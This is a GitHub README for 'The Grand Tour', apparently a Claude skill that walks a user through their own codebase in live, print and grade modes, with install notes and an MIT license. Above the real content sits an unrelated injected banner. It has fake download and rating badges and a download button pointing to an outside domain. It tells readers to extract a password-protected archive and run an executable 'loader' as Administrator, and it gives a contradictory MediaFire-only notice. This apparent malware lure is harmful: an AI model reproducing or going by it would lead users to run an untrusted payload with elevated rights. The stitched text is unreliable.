<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# The Grand Tour

A Claude skill that walks you through a codebase you built, usually with an AI, until you can **explain how it works**: to a user, a collaborator, an interviewer, or an engineer pairing with you.

## Why

Building with an AI often leaves you with a system you understand from the inside and still can't talk about. You know what it does, you had the ideas, you can extend it. Then someone asks "so how does it work?" and the answer comes out vague, or it comes out as *why* you built it rather than *what it does*.

The Grand Tour closes that gap. It reads the whole repo, picks one metaphor that fits its shape, traces one real run through the actual code with toy data, gives you the proper names for patterns you built by instinct, and then makes you say it back, in your own words, until it holds up.

It works just as well for onboarding someone to a team's codebase: it reads the git history, notices the visitor didn't write it, and addresses them as the new owner instead of the builder. Nobody has to say which they are.

It's written to you, as the person who built (or now owns) the thing. It isn't a code review. Problems get their own section near the end, phrased as things you'll want to change, and every real one is there: security findings and confirmed bugs are never cut to save space.

## Three modes

| Mode | What you get |
|---|---|
| **live** (default) | A long guided-tour page, then a six-round scavenger hunt in chat. Most rounds are *Explain how*: a listener, a budget, and you answer in your own words. You get graded on accurate / fitted / confident, then asked to try again. |
| **`print`** | A 14–18 page field guide and workbook to take somewhere with a pen. The guide, eight exercises with two-draft writing space and a printed self-check, and an answer key behind a fold-under stop page that gives the *ingredients* of a good answer, never a paragraph to memorize. |
| **`grade`** | Photograph your filled workbook pages and bring them back. It reads your handwriting, grades your second drafts, checks the stamps you gave yourself, and builds a talking-points card from **your** sentences wherever they passed. |

## Install

The skill is this whole folder: `SKILL.md` plus `assets/` (the field-guide style and its fonts) and `examples/` (the reference pages both modes copy their markup from). If only `SKILL.md` gets installed somewhere, the skill fetches the rest from this repo.

- **Claude Code:** clone or copy this folder to `~/.claude/skills/grand-tour/`.
- **Claude apps:** zip this folder and upload it as a custom skill in Claude's settings.

## Use

```
Give me a grand tour of this repo.
grand-tour print
grand-tour grade        (with photos of your filled pages attached)
```

Live mode needs nothing extra: the page is one HTML file with the fonts embedded. Print mode renders the booklet with headless Chromium (Playwright works), and uses `pdftotext` and `pdftoppm` (from Poppler) to fill in page references and check the layout.

## What's in here

```
SKILL.md                      the skill
assets/field-guide/           the style both modes use: brand book, stylesheet, fonts
  README.md                   voice, layout, components, screen and print mechanics
  components/fonts.css        @font-face for the three bundled families (booklets)
  components/fonts-inline.css the same fonts, subset and embedded (single-file tour pages)
  components/bundle.css       the stylesheet, with print and screen layers
  fonts/                      Charter, TeX Gyre Heros Cn, DejaVu Sans Mono (+ LICENSES.md)
examples/                     a finished live tour page, a finished booklet (PDF and HTML), the preview image
```


---

MIT License

Copyright (c) 2026 closestfriend

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

The fonts in assets/field-guide/fonts/ are not covered by this license; see
assets/field-guide/fonts/LICENSES.md.
